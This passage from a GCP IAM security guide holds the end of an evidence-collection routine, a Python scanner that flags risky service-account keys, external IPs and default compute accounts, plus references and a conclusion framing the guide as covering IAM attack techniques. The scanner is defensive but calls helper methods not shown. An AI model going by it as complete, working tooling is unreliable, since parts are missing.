        # Collect storage bucket configurations
        evidence['storage_buckets'] = self.collect_storage_evidence()

        # Export evidence
        evidence_file = f'gcp_incident_evidence_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}.json'
        with open(evidence_file, 'w') as f:
            json.dump(evidence, f, indent=2, default=str)

        print(f"Forensic evidence collected: {evidence_file}")
        return evidence_file
```

## Tools and Automation

### GCP Security Scanner

```python
#!/usr/bin/env python3
"""
GCP Security Assessment Tool
"""

import json
from datetime import datetime
from google.oauth2 import service_account
from googleapiclient.discovery import build

class GCPSecurityScanner:
    def __init__(self, credentials_path, project_id):
        self.credentials = service_account.Credentials.from_service_account_file(
            credentials_path
        )
        self.project_id = project_id

    def comprehensive_security_scan(self):
        """Perform comprehensive GCP security assessment"""
        scan_results = {
            'scan_timestamp': datetime.utcnow().isoformat(),
            'project_id': self.project_id,
            'findings': []
        }

        # IAM Assessment
        iam_findings = self.assess_iam_security()
        scan_results['findings'].extend(iam_findings)

        # Compute Security
        compute_findings = self.assess_compute_security()
        scan_results['findings'].extend(compute_findings)

        # Storage Security
        storage_findings = self.assess_storage_security()
        scan_results['findings'].extend(storage_findings)

        # Network Security
        network_findings = self.assess_network_security()
        scan_results['findings'].extend(network_findings)

        return scan_results

    def assess_iam_security(self):
        """Assess IAM configuration for security issues"""
        findings = []

        iam_service = build('iam', 'v1', credentials=self.credentials)

        try:
            # Check service accounts
            sa_request = iam_service.projects().serviceAccounts().list(
                name=f'projects/{self.project_id}'
            )
            service_accounts = sa_request.execute().get('accounts', [])

            for sa in service_accounts:
                sa_email = sa['email']

                # Check for user-managed keys
                keys_request = iam_service.projects().serviceAccounts().keys().list(
                    name=f'projects/{self.project_id}/serviceAccounts/{sa_email}'
                )
                keys = keys_request.execute().get('keys', [])

                user_managed_keys = [k for k in keys if k.get('keyType') == 'USER_MANAGED']

                if len(user_managed_keys) > 2:
                    findings.append({
                        'severity': 'HIGH',
                        'category': 'IAM',
                        'title': 'Excessive Service Account Keys',
                        'description': f'Service account {sa_email} has {len(user_managed_keys)} user-managed keys',
                        'resource': sa_email,
                        'recommendation': 'Rotate and minimize service account keys'
                    })

                # Check for old keys
                for key in user_managed_keys:
                    key_age = self.calculate_key_age(key.get('validAfterTime'))
                    if key_age.days > 90:
                        findings.append({
                            'severity': 'MEDIUM',
                            'category': 'IAM',
                            'title': 'Old Service Account Key',
                            'description': f'Key {key["name"]} is {key_age.days} days old',
                            'resource': key['name'],
                            'recommendation': 'Rotate service account keys regularly'
                        })

        except Exception as e:
            findings.append({
                'severity': 'ERROR',
                'category': 'IAM',
                'title': 'IAM Assessment Failed',
                'description': str(e),
                'resource': 'IAM Service',
                'recommendation': 'Check IAM permissions for scanner'
            })

        return findings

    def assess_compute_security(self):
        """Assess Compute Engine security configuration"""
        findings = []

        compute_service = build('compute', 'v1', credentials=self.credentials)

        try:
            # List instances in all zones
            zones_request = compute_service.zones().list(project=self.project_id)
            zones = zones_request.execute().get('items', [])

            for zone in zones:
                zone_name = zone['name']

                instances_request = compute_service.instances().list(
                    project=self.project_id,
                    zone=zone_name
                )
                instances = instances_request.execute().get('items', [])

                for instance in instances:
                    instance_name = instance['name']

                    # Check for external IP
                    for interface in instance.get('networkInterfaces', []):
                        if interface.get('accessConfigs'):
                            findings.append({
                                'severity': 'MEDIUM',
                                'category': 'COMPUTE',
                                'title': 'Instance with External IP',
                                'description': f'Instance {instance_name} has external IP access',
                                'resource': f'{zone_name}/{instance_name}',
                                'recommendation': 'Use Cloud NAT instead of direct external IPs'
                            })

                    # Check for default service account usage
                    for sa in instance.get('serviceAccounts', []):
                        if 'compute@developer.gserviceaccount.com' in sa.get('email', ''):
                            findings.append({
                                'severity': 'HIGH',
                                'category': 'COMPUTE',
                                'title': 'Default Compute Service Account',
                                'description': f'Instance {instance_name} uses default compute service account',
                                'resource': f'{zone_name}/{instance_name}',
                                'recommendation': 'Create dedicated service account with minimal permissions'
                            })

        except Exception as e:
            findings.append({
                'severity': 'ERROR',
                'category': 'COMPUTE',
                'title': 'Compute Assessment Failed',
                'description': str(e),
                'resource': 'Compute Engine',
                'recommendation': 'Check Compute Engine permissions for scanner'
            })

        return findings

if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("Usage: python gcp_security_scanner.py <credentials_file> <project_id>")
        sys.exit(1)

    scanner = GCPSecurityScanner(sys.argv[1], sys.argv[2])
    results = scanner.comprehensive_security_scan()

    # Print summary
    high_findings = [f for f in results['findings'] if f['severity'] == 'HIGH']
    medium_findings = [f for f in results['findings'] if f['severity'] == 'MEDIUM']

    print(f"\n=== GCP Security Scan Results ===")
    print(f"Project: {results['project_id']}")
    print(f"High Severity Issues: {len(high_findings)}")
    print(f"Medium Severity Issues: {len(medium_findings)}")
    print(f"Total Issues: {len(results['findings'])}")

    # Save detailed results
    output_file = f"gcp_security_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"Detailed results saved to: {output_file}")
```

## References and Resources

- [GCP IAM Best Practices](https://cloud.google.com/iam/docs/using-iam-securely)
- [Google Cloud Security Command Center](https://cloud.google.com/security-command-center)
- [GCP Security Scanner Tools](https://github.com/GoogleCloudPlatform/security-analytics)
- [Cloud Asset Inventory](https://cloud.google.com/asset-inventory/docs)
- [GCP Incident Response](https://cloud.google.com/architecture/framework/security/incident-response)

## Conclusion

GCP IAM exploitation requires understanding the complex interplay between service accounts, organization policies, and resource hierarchies. The techniques documented here represent sophisticated attack methods that leverage GCP's extensive service ecosystem for supply chain compromises. Defenders must implement comprehensive monitoring, least-privilege access controls, and robust incident response procedures to protect against these advanced threats.